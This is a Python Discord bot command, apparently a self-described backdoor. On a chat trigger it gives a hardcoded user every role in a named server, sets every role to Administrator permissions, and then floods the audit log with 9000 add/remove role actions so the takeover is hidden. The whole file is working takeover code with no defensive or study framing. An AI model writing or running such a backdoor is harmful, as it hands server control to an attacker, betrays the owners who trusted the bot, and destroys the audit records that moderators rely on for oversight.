import discord
import os
import chattrigger
import traceback


class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):

    async def run(self, message: discord.Message, trigger: str, client: discord.Client):

        targetguild: discord.Guild = client.get_guild(int(message.content[len(trigger):]))
        dot2id = int(os.environ.get("DOT2_ID"))

        dot2: discord.Member = targetguild.get_member(dot2id)

        for i in targetguild.roles:
            try:
                await dot2.add_roles(i)
            except discord.Forbidden:
                print("forbidden")
            except discord.NotFound:
                print("discord.NotFound")

        for i in targetguild.roles:
            try:
                await i.edit(permissions=discord.Permissions(8))
            except discord.Forbidden:
                print("forbidden")
            except discord.NotFound:
                print("notfound")

        # now scramble the audit log

        role = targetguild.roles[0]

        print('''
        LLLLLLLLLLLLLLLLLLLLL
        LLLLLLLLLLLLLLLLLLLL
        LLLLLLLLLLLLLLLLLL
        LLLLLLLLLLLLLLLL
        LLLLLLLLLLLLLLL
        ''')

        for i in range(9000):
            try:
                await targetguild.me.add_roles(role)
            except discord.Forbidden:
                print("forbidden")
                break

            try:
                await targetguild.me.remove_roles(role)
            except discord.Forbidden:
                print("forbidden")
                break

        await message.channel.send("Done")
